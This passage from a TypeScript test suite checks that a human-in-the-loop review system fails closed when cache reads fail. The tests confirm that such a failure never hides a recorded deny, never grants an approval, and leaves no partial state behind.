    expect(denied).toEqual({ status: "recorded", ruling: "deny" });
    await withFailingStore(
      (raw) => raw?.includes('"ruling"') ?? false,
      async () => {
        // The stored deny cannot be read: the repeated offer must fail, not
        // stage over a denial it could not see.
        await expect(
          stageHitlReview({
            session: reviewSession,
            review: longReview(offerId),
          }),
        ).rejects.toThrow("transient cache read failure");
        // The outage was transient; the deny is still there.
        expect(await peekHitlRuling({ session: reviewSession, offerId })).toBe(
          "deny",
        );
      },
    );
  });

  test("an unreadable stage fails staging closed instead of dropping the issued presentation", async () => {
    const offerId = "offer-failclosed-stage-read";
    const reviewSession = session("user:user|failclosed-stage-read");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    await withFailingStore(
      (raw) => raw?.includes('"text"') ?? false,
      async () => {
        await expect(
          stageHitlReview({
            session: reviewSession,
            review: longReview(offerId),
          }),
        ).rejects.toThrow("transient cache read failure");
        // The issued stage survived the outage untouched.
        expect(await issuedDigest(reviewSession, offerId)).toBe(
          hitlInspectionDigest(longReview(offerId)),
        );
      },
    );
  });

  test("a failed ruling read inside the lock cannot hide an existing deny", async () => {
    const offerId = "offer-failclosed-locked-deny";
    const reviewSession = session("user:user|failclosed-locked-deny");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    const denied = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "deny",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(denied).toEqual({ status: "recorded", ruling: "deny" });
    failNextLockedRead();
    await expect(
      resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "approve",
        carriedReviewText: true,
        claimDigest: digest,
      }),
    ).rejects.toThrow("transient cache read failure");
    // The deny was neither hidden nor replaced.
    expect(await peekHitlRuling({ session: reviewSession, offerId })).toBe(
      "deny",
    );
  });

  test("a failed read inside the lock grants nothing and leaves the stage spendable", async () => {
    const offerId = "offer-failclosed-locked-grant";
    const reviewSession = session("user:user|failclosed-locked-grant");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    failNextLockedRead();
    await expect(
      resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "approve",
        carriedReviewText: false,
        claimDigest: digest,
      }),
    ).rejects.toThrow("transient cache read failure");
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
    // The rollback left no partial state: the same card can still approve.
    const approved = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(approved).toEqual({ status: "recorded", ruling: "approve" });
  });
});
